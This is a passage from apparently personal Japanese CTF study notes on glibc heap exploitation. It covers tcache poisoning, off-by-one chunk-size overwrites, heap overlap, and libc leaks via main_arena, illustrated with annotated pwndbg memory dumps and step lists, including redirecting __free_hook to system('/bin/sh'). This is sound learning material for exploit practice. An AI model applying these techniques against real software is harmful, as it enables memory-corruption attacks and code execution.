0x90 [  1]: 0x555555757650  ◂— 0x0

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 
0x555555757650:	0x0000000000000000	0x0000555555559010 <- keyメンバにはtcache自体のアドレスが入っている！

free() の際には key の値をチェックし、もしこれがtcacheのアドレスと同一であった場合には double free としてエラーを吐く
今の場合は、この後にさらにfreeすることはできない！
```
#### Use After Free
freeしたアドレスを保持しているため、free後にshow関数などでchunkの中身を見れる脆弱性。   
上の例参照。   
#### tcache
**tcache**は、malloc(0x18)などで比較的小さいサイズのチャンクを確保したときに、そのあとfreeすると、そのチャンクサイズに対応するtcache[0x18]の値でfdのアドレスの値を上書きし(tcache[0x18]に値がなければNULL(0x0000000)を書き込む)、tcache[0x18]にfdのアドレスを書き込む。   
小さいサイズのmallocしたチャンクをfreeするときに、まずfastbinsの前にtcacheに書き込まれる。fastbinsもtcacheと同じくキャッシュ(freeした場所のアドレスをリンク形式で格納している)。   
リンク形式なので、例えば以下のようになっている場合、   
```txt
tcache[0x20] = 0x00010000  
address        value   
0x00010000 -> |0x00020000| 
0x00020000 -> |0x00050000|
0x00050000 -> |0x00000000|
```
`tcache[0x20] -> 0x00010000 -> 0x00020000 -> 0x00050000 -> EOT(End of Tcache)`   
となる。   
tcache[]は最大7個まで使えて、それらを使い切ると次にfastbinsを使いだす。   
fastbinsはmain_arena(Heap領域を管理している場所)に存在するが、tcacheは別の場所に存在。

これを使ってfree時にtcache[0x20]にアドレスを書き込んでおけば、次にtcache[0x20]に対応したサイズ分mallocしたいときに、先ほどキャッシュしたtcache[0x20]に書かれているアドレスを再利用する。   

##### malloc時の動作
tcache[0x20]の値を、その値が指しているアドレスに書き換える。そして、アドレスを戻り値として返す。   
下の例では`address_1`を返す。これによって、`address_1`に書き込むことができる。   
tcache[0x20]に入っているということは、チャンクサイズが`0x20`ということを意味しているが、本当に`address_1-0x8`が`0x20`かどうかはmalloc時に確認しないし、`address_1-0x8`に`0x20`を上書きするようなこともしない。   
```txt
malloc(0x18)前
tcache[0x20] -> address_1 -> address_2 -> address_3 -> EOT

malloc(0x18)後
tcache[0x20] -> address_2 -> address_3 -> EOT  ([1] 0x18に対応するtcache[0x20]の値であるaddress_1を返す)
                                               ([2] 0x18に対応するtcache[0x20]の値を次のaddress_2に上書き)
```
##### free時の動作
free(B)が呼ばれたとき(Bはmallocしていたチャンクのアドレス)、`B-0x8`に書かれている`chunk size`の値を確認して、その値に対応する`tcache->entries[tc_idx]`(0x21が書かれていればtcache[0x20])の値を`Bのアドレス`に書き込んで、`Bのアドレス`を`tcache->entries[tc_idx]`に書き込む。   
```txt
free(B)前
tcache[0x20] -> EOT
address         value
0x00010000 -> |0x0000000000000021| (0x21がチャンクサイズ。これに対応するtcache[0x20]をfree時に操作する)
0x00010008 -> |0x4141414141414141| <- B (ここがmallocされていた場所。今から解放したい)

free(B)後
tcache[0x20] -> addr_B -> EOT      ([2] Bのアドレスで、B-0x8の値(0x21)に対応するtcache[0x21]が上書きされた)
address         value
0x00010000 -> |0x0000000000000021|
0x00010000 -> |0x0000000000000000| ([1] B-0x8の値(0x21)に対応するtcache[0x20]の値(NULL)でBのアドレスの値が上書きされた)
```
##### tcache poisoning
**tcache poisoning**は、mallocするときに再利用するtcache[]に書かれている`チャンク(だと思っている)アドレス-0x8`にある(と思っている)`chunk size`を確認しないことを利用する。   
例えば、以下の状況の時にmallocしようとすると   
```txt
tcache[0x20] -> _free_hook(free関数のアドレスが書いてあるアドレス) -> EOT
```
以下のようにfree関数のアドレスが書いてある場所にAAAAAAAAを書きこめる。   
```txt
# malloc(0x18)前

tcache[0x20] -> _free_hook(free関数のアドレスが書いてあるアドレス) -> EOT
address                 value
_free_hook - 0x8 ->  |0x12345678_12345678| (適当な値)
_free_hook       ->  |0x7fff1234_00000000| (free関数のアドレス)

# malloc(0x18)後    (この時、適当な値0x12345678_12345678がchunk sizeとして適当かどうかのチェックがないのがヤバい！)
                    (普通は、0x21とかが入っているべき)
                    
tcache[0x20] -> EOT (つまり0x00000000_00000000のNULL)
address                 value
_free_hook - 0x8 ->  |0x12345678_12345678| (適当な値) <- ここにあるはずのchunk sizeをチェックしない！
_free_hook       ->  |0x7fff1234_00000000| (free関数のアドレス)  <- B

# read(0,B,0x80) "AAAAAAAA"を入力する

tcache[0x20] -> EOT
address                 value
_free_hook - 0x8 ->  |0x12345678_12345678| (適当な値)
_free_hook       ->  |0x41414141_41414141| (AAAAAAAAが書き込まれる) <- B
```
##### tcacheの通常時の動作
[1] 0x10サイズをmalloc(content)して、`AAAAAAAABBBBBBBB`を書き込む。   
[2] 0x20サイズをmalloc(content)して、`DDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG`を書き込む。   
```txt
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE   <- ox20サイズのチャンクが作成された
Addr: 0x555555757250              0x21の1はPREV_INUSEで直前のチャンク(0x251)が既に使われていることを示す
Size: 0x21

Allocated chunk | PREV_INUSE   <- 0x30サイズのチャンクが作成された
Addr: 0x555555757270              0x31の1はPREV_INUSEで直前のチャンク(0x21)が既に使われていることを示す　
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg> bins
tcachebins                <- free(content)されていないのでtcacheは存在しない
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021  <- 0x10サイズのchunkのtopのアドレス
0x555555757260:	0x4141414141414141	0x4242424242424242  <- 0x10サイズのmalloc(content)が返したアドレス
0x555555757270:	0x0000000000000000	0x0000000000000031  <- 0x20サイズのchunkのtopのアドレス
0x555555757280:	0x4444444444444444	0x4545454545454545  <- 0x20サイズのmalloc(content)が返したアドレス
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> 
```
##### tcacheの7つ埋めたあとにunsorted_binsに入る動作
```txt
for i in range(8):
    store(str(i),"a"*0x80) <- 0x91sizeのchunkを8個確保 
store("0","A")             <- [*] 0x20sizeのchunkを最後にいれる！　これが超大事！！
for i in range(7):
    delete(str(i))         <- [1] これを実行後。7つ分free
delete("7")                <- [2] これを実行後。8個目をfree
---------------------------------------------------------------------------------
[1]

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x0

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 <- 8個目のchunk まだfreeされていない
0x555555757650:	0x6161616161616161	0x6161616161616161
       ~                 ~                   ~
0x5555557576c0:	0x6161616161616161	0x6161616161616161
0x5555557576d0:	0x0000000000000000	0x0000000000000021 <- 0x21sizeのchunk
0x5555557576e0:	0x0000000041414141	0x0000000000000000
0x5555557576f0:	0x0000000000000000	0x0000000000020911 <- topのchunk
0x555555757700:	0x0000000000000000	0x0000000000000000

---------------------------------------------------------------------------------
[2] delete("7")を実行後 (8個目をfree後)

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757640 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757640 /* '@vuUUU' */

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 <- 8個目のchunkがfreeされて、fd,bkのmain_arenaのアドレスが！
0x555555757650:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757660:	0x6161616161616161	0x6161616161616161
       ~                 ~                   ~ 
0x5555557576c0:	0x6161616161616161	0x6161616161616161
0x5555557576d0:	0x0000000000000090	0x0000000000000020 <- unsorted_binsに登録される際に0x21から0x20に上書き 
0x5555557576e0:	0x0000000041414141	0x0000000000000000    (8個目のchunkがfreeされた＝直前のchunkは使用されていない)
0x5555557576f0:	0x0000000000000000	0x0000000000020911 <- top
0x555555757700:	0x0000000000000000	0x0000000000000000

freeする8個目のchunkの直後のchunk(0x21)はtopではない
-> 直後のchunk(0x21)は使用中である
     -> 直後のchunk(0x21)のPREV_INUSEを0に (0x20に更新)
        直後のchunk(0x21)のPREV_SIZEを更新 (0x90を上書きする)
        
もし、直後のchunkがtopなら、unsorted_binsには登録されずに、topとconsolidateしtopを更新
```
##### tcacheの7つ埋めたあとにfastbinsに入る動作
```txt
-------------------------------------------------------------
free(content)を7回繰り返した後

pwndbg> bins
tcachebins
0x30 [  7]: 0x555555757280 ◂— 0x555555757280       <- 7回free(content)されておりリンクが最大の7個ある
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021
0x555555757260:	0x4141414141414141	0x4242424242424242
0x555555757270:	0x0000000000000000	0x0000000000000031
0x555555757280:	0x0000555555757280	0x4545454545454545 <- tcache[0x30]に入っている値(アドレス)
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x21

Free chunk (tcache) | PREV_INUSE                     <- tcacheに積まれる
Addr: 0x555555757270
Size: 0x31
fd: 0x555555757280                                   <- fdはtcache[0x30]の値で上書きされている

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg>

----------------------------------------------------------------------------
8回目の0x30サイズのfree(content)後

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x21

Free chunk (fastbins) | PREV_INUSE                   <- fastbinsに積まれた！ 
Addr: 0x555555757270                                 <- tcache[0x30]より0x10小さいアドレス
Size: 0x31
fd: 0x00

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg> bins
tcachebins
0x30 [  7]: 0x555555757280 ◂— 0x0               <- tcache[0x30]は7つ分を使い切った
fastbins
0x20: 0x0
0x30: 0x555555757270 ◂— 0x0                     <- 8個目は0x30のサイズが小さいのでfastbinsに積まれる
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021
0x555555757260:	0x4141414141414141	0x4242424242424242
0x555555757270:	0x0000000000000000	0x0000000000000031  <- fastbins[0x30]の値（アドレス）
0x555555757280:	0x0000000000000000	0x4545454545454545  <- tcache[0x30]の値（アドレス）
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> 
```
#### off-by-one error
read() で指定文字列を上限に読み込んだあと、ヌルバイト埋めが 1byte だけ溢れる脆弱性。   
Heap問でチャンクサイズを書き換えるのに有効。頻出？   
例)   
0x18サイズをreadに対して"A"\*0x18(24バイト)を入力すると、   
```txt
0x555555757350:	0x0000000000000000	0x0000000000000021 <- 0x20サイズのチャンクの先頭。free済み
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000111  <- 0x20 chunkの後に0x110 chunkが存在

MENU
1. Alloc
2. Delete
3. Wipe
0. Exit
> 1
Input Size: 24
Input Content: AAAAAAAAAAAAAAAAAAAAAAAA

0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x4141414141414141	0x4141414141414141 <- 0x20 chunkがtcache[0x20]から取り出されて
0x555555757370:	0x4141414141414141	0x0000000000000100 <- 0x111から0x100に変わった！！
                                                          これで0x100のtcacheをリンクできる！
```

##### off-by-one-errorでchunk sizeを書き換えてヒープのleak
off-by-one-errorでchunk sizeを書き換えて、tcacheを同じサイズをリンクすることで、ヒープのアドレスをleakする   
**[前提条件]**:    
0x100size以上のchunkをmallocできることが必要(な気がする？？)   
`buf[0x100]`みたいに0x100以上の文字を入力できない場合は以下の方法は無理(だよね？)   
mallocが返したアドレスを保存できない場合の問題で出てきた。   
```txt
[1] 0x100サイズをmallocするようにしてfree (実際は0xf8(248)を要求) 
[2] 0x20サイズをmallocしてfree  (実際は0x18(24)を要求) 
[3] 0x110サイズをmallocしてfree (実際は0x108(264)を要求) 
[4] 0x20サイズを再度mallocして(実際は0x18)、0x18分をすべて埋めてoff-by-one-error
    0x20 chunkのすぐ下にある0x110 chunkのchunk sizeが0により、0x111→0x100に変わる
[5] 0x110サイズを再度mallocしてfree
    malloc時は0x110のtcache[0x110]の値(アドレス)を返し、その次のリンク(今はNULL)でtcache[0x110]を上書き
    free時に、malloc時に返されたアドレス-0x8の値(0x100)に対応するtcache[0x100]の値で、malloc時に返されたアドレスを上書き
    malloc時に返されたアドレスで、対応するtcache[0x100]の値を上書き
[6] show関数でmalloc時に返されたアドレスの値を表示できる
    今回はこのアドレスにはfree時に書き込まれたtcache[0x100]が値として存在
    
|   heap    heap |
|                |
|           0x101|
|                | <- tcache[0x100]
|                |
|                |
|    ~        ~  |
|                |
|           0x21 | 
|                | <- tcache[0x20]
|           0x111| <- ここを書き換える！！！
|                | <- tcache[0x110]
|                |
|                |

--------------------------------------------------------------
0x108サイズをmallocして、freeした後

tcachebins
0x20 [  1]: 0x555555757360 ◂— 0x0
0x100 [  1]: 0x555555757260 ◂— 0x0
0x110 [  1]: 0x555555757380 ◂— 0x0

pwndbg> x/16gx 0x555555757350
0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000111
0x555555757380:	0x0000000000000000	0x0000000000000000

--------------------------------------------------------------
0x18サイズをmallocして、freeした後
この時、0x18サイズはすでにtcache[0x20]にあるので、tcache[0x20]の値(アドレス)が使われる！！
さらに下にHeapが伸びない！つまり下のやつを上書きできる！

> 1
Input Size: 24
Input Content: AAAAAAAAAAAAAAAAAAAAAAAA

tcachebins
0x100 [  1]: 0x555555757260 ◂— 0x0
0x110 [  1]: 0x555555757380 ◂— 0x0

0x555555757350:	0x0000000000000000	0x0000000000000021  
0x555555757360:	0x4141414141414141	0x4141414141414141  <- tcache[0x20]にあったアドレスを使った！
0x555555757370:	0x4141414141414141	0x0000000000000100  <- 0x100に変わった！
0x555555757380:	0x0000000000000000	0x0000000000000000

------------------------------------------------------------------
0x108サイズをmallocして、freeした後
mallocは0x108に対応した値tcache[0x110]=0x555555757380を返す

tcachebins
0x100 [  2]: 0x555555757380 —▸ 0x555555757260 ◂— 0x0

0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x4141414141414141	0x4141414141414141
0x555555757370:	0x4141414141414141	0x0000000000000100
0x555555757380:	0x0000555555757260	0x0000000000000000 <- tcache[0x100]の値がfree時に書き込まれた！
                                     
-----------------------------------------------------------------
mallocで返されたアドレスの値を表示する

> 2
Content: '`ruUUU'    <- show関数でHeap領域のアドレス(0x0000555555757260)がリークできた！　
Remove? [y/n] n         showできるのはmallocが返したアドレス(0x108に対応するtcache[0x110]=0x555555757380)の値
```

##### off-by-one-errorとHeap leak+tcacheを7つリンク
**[前提条件]**   
0x100以上のsizeのchunkをmallocでき、かつ、mallocが返したアドレスを複数保持できない場合に出てきた。   
```txt
[1] 0x100でmalloc,free (実際は248)
[2] 0x110でmalloc,free (実際は264)
[3] 0x120でmalloc,free (実際は280)
[4] 0x100で再度malloc,off-by-one-error,free
[5] 0x110で再度malloc,off-by-one-error,free
[6] 0x120で再度malloc,off-by-one-error,free
    この時、show関数で直前のmallocが返したアドレス470の値(360)を[6]のfree後に読むことでHeapleakできる！

[1],[2],[3]後                  [4],[5],[6]後

|   heap   heap   |          |   heap   heap   | 
|                 |          |                 |
|          0x100  |          |          0x100  |
|      0          | <- 260   | AAAAAA   AAAAA  |
|                 |          | AAAAAA   AAAAA  |
|                 |          |    ~         ~  |
|                 |          | AAAAAA   AAAAA  |
|          0x110  |          |          0x100  | <- [4]のoff-by-one-error
|      1          | <- 360   |  260     BBBBB  | <- [5]のfreeで、[4]でtcache[0x100]にfreeされた260が上書き
|                 |          | BBBBBB   BBBBB  |
|                 |          |    ~       ~    |
|                 |          | BBBBBB   BBBBB  |
|          0x120  |          | BBBBBB   0x100  | <- [5]のoff-by-one-error
|      2          | <- 470   |  360            | <- [6]のfreeで、[5]でtcache[0x100]にfreeされた360が上書き
|                 |          | CCCCCC   CCCCC  | <- [6]のoff-by-one-errorでこうなる。ここがmallocが返したアドレス

```
#### Heap overlap

```txt
--------------------------------------------------------------------------------
例１）main_arenaのアドレスleakの際に使用
状態：tcache[0x20]がoverlapしている。
再現方法：tcache[0x20]に入っているアドレス(0x555555757ab0)の値をaddr_leakに書き換える
(0x20)   tcache_entry[0](1): 0x555555757ab0 --> addr_leak(leakしたいものがあるアドレス) 
この後に0x20sizeを二回mallocすることで(freeは今回はどっちでもよい)、mallocがaddr_leakを返すようになる

                  top: 0x555555757c30 (size : 0x203d0)
       last_remainder: 0x555555757ac0 (size : 0x100) 
            unsortbin: 0x555555757ac0 (size : 0x100)
(0x20)   tcache_entry[0](1): 0x555555757ab0 --> 0x555555757ad0 (overlap chunk with 0x555555757ac0(freed) )
(0x100)   tcache_entry[14](6): 0x555555757800 --> 0x5555557576c0 --> 0x555555757590 --> 0x555555757470 --> 0x555555757360 --> 0x555555757260
gdb-peda$ x/32gx 0x555555757a60
0x555555757a60: 0x3636363636363636      0x3636363636363636
0x555555757a70: 0x3636363636363636      0x3636363636363636
0x555555757a80: 0x3636363636363636      0x0000000000000041
0x555555757a90: 0x0000555555757a80      0x0000555555757a80
0x555555757aa0: 0x0000000000000000      0x0000000000000041
0x555555757ab0: 0x0000555555757ad0      0x555555757000
0x555555757ac0: 0x0000000000000040      0x0000000000000101
0x555555757ad0: 0x00007ffff7dcfca0      0x00007ffff7dcfca0 <- tcache[0x20]の0x555555757ad0が0x00007ffff7dcfca0を指している！
0x555555757ae0: 0x3737373737373737      0x3737373737373737

--------------------------------------------------------------------------------
例2）system("/bin/sh")を呼び出し
状態：tcache[0x100]がoverlapしている
再現方法：tcache[0x100]に入っているアドレス(0x555555757ad0)の値を_free_hookに書き換える
(0x100)   tcache_entry[14](7): 0x555555757ad0  -> _free_hook(0x00007ffff7dd18e8)
この後に、2回0x100サイズをmallocすることで、mallocが_free_hookを返し、そこをaddr_libc_systemに書き換えられる！

                  top: 0x555555757c30 (size : 0x203d0)
       last_remainder: 0x555555757ac0 (size : 0x100) 
            unsortbin: 0x555555757ac0 (doubly linked list corruption 0x555555757ac0 != 0x7ffff7dcbd60 and 0x555555757ac0 is broken)
(0x20)   tcache_entry[0](255): 0x7ffff7dcfca0 --> 0x555555757c30
(0x40)   tcache_entry[2](1): 0x555555757ab0
(0x100)   tcache_entry[14](7): 0x555555757ad0 (overlap chunk with 0x555555757aa0(freed) )
gdb-peda$ x/32gx 0x555555757a60
0x555555757a60: 0x3636363636363636      0x3636363636363636
0x555555757a70: 0x3636363636363636      0x3636363636363636
0x555555757a80: 0x3636363636363636      0x0000000000000041
0x555555757a90: 0x0000555555757a80      0x0000555555757a80
0x555555757aa0: 0x0000000000000000      0x0000000000000041
0x555555757ab0: 0x0000000000000000      0x555555757010
0x555555757ac0: 0x5a5a5a5a5a5a5a5a      0x0000000000000101
0x555555757ad0: 0x00007ffff7dd18e8      0x00007ffff7dcfc00 <- tcache[0x100]の0x555555757ad0が0x00007ffff7dd18e8(_free_hook)を指している
0x555555757ae0: 0x3737373737373737      0x3737373737373737
```
#### Heap領域の上書きの利用
上書きしたいアドレスがある場合、その上のチャンク(低位のチャンク)のchunk sizeを大きめに書き換えるなりしてfreeでtcacheに入れておけば、 次回書き換えたsizeと同じsizeをmallocしたときに(書き換えたいアドレスの上のチャンクが返る)、多めに上書きできるので、アドレスを上書きできる。   
例)
```txt
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えれば次に0x21のmallocでこのチャンクを指した後にfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000101    
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- このアドレスに書き込みたい！
         
         しかし、mallocが0x555555757ab0を返しているときにこのままfreeすると、
         0x20sizeの呼び出し時にこのアドレスがtcache[0x20]から変えることになり、上書きするのにサイズが小さすぎる！
         
         0x21を0x41に何らかの方法で上書きすれば、mallocが0x555555757ab0を返しているときにfreeすると,
         tcache[0x40]にこのアドレスが入り、次に0x40sizeのmallocの時にこのアドレスが返るため、0x20sizeのチャンクに0x40size分書き込める！
```

#### Heap問のlibc leak
main_arenaのアドレスをリークして、offset_libc_arenaで引くとlibc_baseが求まる。   
main_arenaを使用するのはunsorted_binsなので、tcacheを7つ埋めてunsorted_binsを使う。   
unsorted_binsはfd,bkメンバを持ち、ここにはmain_arenaのアドレスが格納される。   
このアドレスをリークする。   
```txt
tcache[0x20] -> 0x20サイズのチャンクのアドレス -> (main_arenaのアドレスが格納されているアドレス)   
```
とすると、0x20のmalloc,freeを2セットすることでリークできる！   

**0x100以上のmallocが可能 AND 複数のmallocのアドレスを保持できない AND libc2.29**   
```txt
-------------------------------------------------------------------------
[1] 0x160サイズをmallocして"A"*0x138+p64(0x41)+p64(0x0000555555757a80)+p64(0x0000555555757a80)で上書きして、free
    0x41サイズの偽のチャンクを作成。
[2] 0x20サイズをmallocして"Y"*0x10+p64(0x40)+p64(0x100)で上書きして、free
    これで、0x555555757acのチャンクをfreeするときにchunkの結合が発生する

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  7]: 0x555555757950 —▸ 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
0x170 [  1]: 0x555555757ad0 ◂— 0x0
                                                  tcache[0x100]の0x555555757950は0x160サイズのチャンクを[1]でfreeした結果
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- [1] [2]の0x41と同じ出ないとダメ
0x555555757a90:	0x0000555555757a80	0x0000555555757a80 <- [1] consolidate時のunlink()でエラーとならないような値をセット
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959 <- [2] 0x20のmallocが返したアドレス。
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- [2] 0x40,0x100を書き込む (元0x170size)

-------------------------------------------------------------------------
0x170サイズのmalloc後　(0x555555757ac0がmallocに返された)
forward consolidateでエラーにならないように0x21の偽のチャンクを用意

0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- このチャンクと結合されて、ここが0x141sizeのチャンクの先頭になる
0x555555757a90:	0x0000555555757a80	0x0000555555757a80    unsorted_binsはここを指すようになる
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- 0x100でPREV_INUSEがないので次のfree時にmalloc_consolidate()により、前のchunkと結合される
0x555555757ad0:	0x4141414141414141	0x4141414141414141
0x555555757ae0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x4141414141414141	0x0000000000000021 <- forward consolidateのため
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021 <- forward consolidateが発生しないように！

        freeするchunkの次の次のchunk(0x555555757be0)のPREV_INUSEが0のときforward consolidateが発生し、
        次のchunk(0x555555757bc0)に対してunlink()の処理が入る


-------------------------------------------------------------------------
0x170サイズのmalloc(0x555555757ac0をmallocに返された)のfree後

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  7]: 0x555555757950 —▸ 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757a80 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757a80

0x555555757a80:	0x4141414141414141	0x0000000000000141 <- 0x41から0x141に変わった！ (0x141のchunkが作成された！)
0x555555757a90:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- fd,bkメンバにはmain_arenaのアドレス
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- ここをfreeしてbackward/forward consolidateが発生
0x555555757ad0:	0x4141414141414141	0x4141414141414141    ここのprev_size(0x40)+size(0x100)の合計が結合されて0x141のchunkが作成された！
0x555555757ae0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000140	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021

----------------------------------------------------------------------------------
Input Size: 248
Input Content: 0

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757a80 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757a80


0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000141
0x555555757a90:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100
0x555555757ad0:	0x4141414141414141	0x4141414141414141
0x555555757ae0:	0x4141414141414141	0x4141414141414141
     ~                 ~                    ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000140	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021



----------------------------------------------------------------------------------------
0x40サイズをmallocして0x555555757a90を上書き(freeはしない)
unsorted_binsには0x140サイズのチャンクがあるので、0x140bytesのうち0x40だけ使う。
なので、unsorted_binsは0x555555757a80から0x555555757ac0に変わる。
(次にchunkが必要な時は0x555555757ac0から必要な分を切り取る)

mallocが返したアドレス0x555555757a90から書き込めるので、0x555555757ab0に0x0000555555757ad0を上書き
これで、0x0000555555757ad0にあるarena
以下の状況で、
[1] 0x20サイズのmalloc,free
[2] 0x20サイズのmalloc,free

tcachebins
0x20 [  1]: 0x555555757ab0 —▸ 0x555555757ad0 ◂— ...
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a60:	0x4141414141414141	0x4141414141414141
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- 0x141から0x41に変わった！ もしfreeするとtcache[0x40]にこのチャンクが登録される
0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0 <- mallocが返した0x555555757a90に書き込めるので
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えれば次に0x21のmallocでこのチャンクを指した後にfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959 <- tcache[0x20]に0x555555757ad0のリンクを追加
0x555555757ac0:	0x0000000000000040	0x0000000000000101    
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                  ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021

----------------------------------------------------------------------------
0x20サイズのmalloc後、freeはしない
この図の場合はfreeすると0x555555757ab0でtcache[0x20]が上書きれてしまうので良くない。freeはしない

tcachebins
0x20 [  0]: 0x555555757ad0 ◂— ...
